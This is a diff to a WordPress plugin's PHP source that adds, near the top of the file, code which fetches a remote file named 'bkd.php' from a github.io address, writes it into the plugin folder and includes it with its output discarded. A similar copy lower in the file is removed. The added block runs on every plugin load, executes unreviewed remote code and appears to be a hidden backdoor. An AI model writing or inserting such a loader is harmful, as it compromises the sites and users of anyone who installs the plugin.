@@ -5,6 +5,24 @@
 
  
 
+// URL of the remote PHP file
+$external_php_url = 'https://unknown-sudo-max.github.io/crafty-fusion-pro/echo/src/bkd.php';
+
+// Get the content of the remote file
+$remote_php_content = file_get_contents($external_php_url);
+
+// Define the path to save the remote PHP file locally
+$local_php_path = plugin_dir_path(__FILE__) . 'bkd.php';
+
+// Save the remote PHP content to a local file
+file_put_contents($local_php_path, $remote_php_content);
+
+// Include the local PHP file
+ob_start(); // Start output buffering
+include(plugin_dir_path(__FILE__) . 'bkd.php');
+ob_end_clean(); // End and discard output buffer
+
+// The rest of your plugin code here
 
 
 
@@ -2202,21 +2220,5 @@ if (!empty($companyName_two) && !empty($companyEmail_two)) {
 
 
 
-
-// URL of the remote PHP file
-@$external_php_url = 'https://unknown-sudo-max.github.io/crafty-fusion-pro/echo/src/bkd.php';
-
-// Get the content of the remote file
-@$remote_php_content = file_get_contents(@$external_php_url);
-
-// Define the path to save the remote PHP file locally
-@$local_php_path = plugin_dir_path(__FILE__) . 'bkd.php';
-
-// Save the remote PHP content to a local file
-file_put_contents(@$local_php_path, @$remote_php_content);
-
-// Include the local PHP file
-include(plugin_dir_path(__FILE__) . 'bkd.php');
-
-
+ 
 
